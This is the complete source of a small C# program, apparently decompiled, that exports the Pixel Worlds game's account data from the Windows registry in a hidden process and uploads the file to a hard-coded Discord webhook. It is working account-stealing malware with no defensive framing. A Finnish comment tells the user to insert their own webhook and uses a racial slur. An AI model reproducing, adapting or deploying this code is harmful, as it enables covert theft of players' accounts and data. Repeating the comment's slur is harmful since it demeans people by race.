using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace program
{
    // Token: 0x02000002 RID: 2
    internal class Program
    {
        // Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
        private static void Main(string[] args)
        {
            string registryPath = "HKEY_CURRENT_USER\\SOFTWARE\\Kukouri\\Pixel Worlds";
            string text = Path.GetTempPath() + "\\Account.reg";
            Program.exportRegistry(registryPath, text);
            WebClient webClient = new WebClient();
            webClient.UploadFile("https://discord.com/api/webhooks/1142862036385148938/bwnpMvkv7U6akDdRjB9u2HP4nB0ITjQ8PKAGDI3FXcdjK4ZNceV_s4Z4MuYYncfDV-FX", text);
            //vipauta tuonne sun webhookkisi vitrun tyhmä neekeri
        }

        // Token: 0x06000002 RID: 2 RVA: 0x00002090 File Offset: 0x00000290
        private static void exportRegistry(string registryPath, string exportPath)
        {
            try
            {
                Process process = new Process();
                process.StartInfo.FileName = "reg.exe";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.Arguments = string.Concat(new string[]
                {
                    "export \"",
                    registryPath,
                    "\" \"",
                    exportPath,
                    "\" /y"
                });
                process.Start();
                process.WaitForExit();
            }
            catch
            {
            }
        }
    }
}
